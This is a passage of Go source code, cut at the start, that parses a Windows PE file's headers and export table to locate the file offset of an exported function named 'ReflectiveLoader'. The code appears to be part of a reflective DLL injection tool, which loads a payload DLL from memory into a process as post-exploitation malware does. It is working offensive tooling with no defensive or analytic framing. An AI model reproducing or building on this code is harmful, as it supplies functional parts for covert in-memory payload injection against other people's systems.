	sizeOfOptionalHeader := binary.LittleEndian.Uint16(pe[coffOff+16 : coffOff+18])

	optOff := coffOff + 20
	if int(optOff)+2 > len(pe) {
		return 0, fmt.Errorf("PE too small for optional header")
	}
	magic := binary.LittleEndian.Uint16(pe[optOff : optOff+2])

	var exportDirRVA uint32
	switch magic {
	case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
		ddOff := optOff + 112
		if int(ddOff)+8 > len(pe) {
			return 0, fmt.Errorf("PE too small for data directory")
		}
		exportDirRVA = binary.LittleEndian.Uint32(pe[ddOff : ddOff+4])
	case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
		// PE32 - export directory is at offset 96 in optional header
		ddOff := optOff + 96
		if int(ddOff)+8 > len(pe) {
			return 0, fmt.Errorf("PE too small for data directory")
		}
		exportDirRVA = binary.LittleEndian.Uint32(pe[ddOff : ddOff+4])
	default:
		return 0, fmt.Errorf("unsupported PE magic: 0x%x", magic)
	}

	if exportDirRVA == 0 {
		return 0, fmt.Errorf("no export directory")
	}

	sectionOff := optOff + uint32(sizeOfOptionalHeader)

	exportDirFileOff := rvaToFileOffset(exportDirRVA, pe, sectionOff, numberOfSections)
	if exportDirFileOff == 0 {
		return 0, fmt.Errorf("failed to resolve export directory RVA")
	}

	if int(exportDirFileOff)+40 > len(pe) {
		return 0, fmt.Errorf("PE too small for export directory")
	}
	numberOfNames := binary.LittleEndian.Uint32(pe[exportDirFileOff+24 : exportDirFileOff+28])
	addressOfFunctionsRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+28 : exportDirFileOff+32])
	addressOfNamesRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+32 : exportDirFileOff+36])
	addressOfNameOrdinalsRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+36 : exportDirFileOff+40])

	namesOff := rvaToFileOffset(addressOfNamesRVA, pe, sectionOff, numberOfSections)
	funcsOff := rvaToFileOffset(addressOfFunctionsRVA, pe, sectionOff, numberOfSections)
	ordinalsOff := rvaToFileOffset(addressOfNameOrdinalsRVA, pe, sectionOff, numberOfSections)
	if namesOff == 0 || funcsOff == 0 || ordinalsOff == 0 {
		return 0, fmt.Errorf("failed to resolve export table RVAs")
	}

	for i := uint32(0); i < numberOfNames; i++ {
		nameRVA := binary.LittleEndian.Uint32(pe[namesOff+i*4 : namesOff+i*4+4])
		nameFileOff := rvaToFileOffset(nameRVA, pe, sectionOff, numberOfSections)
		if nameFileOff == 0 {
			continue
		}

		name := readCString(pe, nameFileOff)
		if contains(name, "ReflectiveLoader") {
			ordinal := binary.LittleEndian.Uint16(pe[ordinalsOff+i*2 : ordinalsOff+i*2+2])
			funcRVA := binary.LittleEndian.Uint32(pe[funcsOff+uint32(ordinal)*4 : funcsOff+uint32(ordinal)*4+4])
			return rvaToFileOffset(funcRVA, pe, sectionOff, numberOfSections), nil
		}
	}

	return 0, fmt.Errorf("ReflectiveLoader export not found")
}

func rvaToFileOffset(rva uint32, pe []byte, sectionOff uint32, numSections uint16) uint32 {
	for i := uint16(0); i < numSections; i++ {
		off := sectionOff + uint32(i)*40
		if int(off)+40 > len(pe) {
			break
		}
		virtualSize := binary.LittleEndian.Uint32(pe[off+8 : off+12])
		virtualAddr := binary.LittleEndian.Uint32(pe[off+12 : off+16])
		rawDataSize := binary.LittleEndian.Uint32(pe[off+16 : off+20])
		rawDataPtr := binary.LittleEndian.Uint32(pe[off+20 : off+24])
		_ = virtualSize

		if rva >= virtualAddr && rva < virtualAddr+rawDataSize {
			return rva - virtualAddr + rawDataPtr
		}
	}
	if numSections > 0 {
		firstSectionRawPtr := binary.LittleEndian.Uint32(pe[sectionOff+20 : sectionOff+24])
		if rva < firstSectionRawPtr {
			return rva
		}
	}
	return 0
}

func readCString(data []byte, offset uint32) string {
	end := offset
	for int(end) < len(data) && data[end] != 0 {
		end++
	}
	return string(data[offset:end])
}

func contains(s, substr string) bool {
	if len(substr) > len(s) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
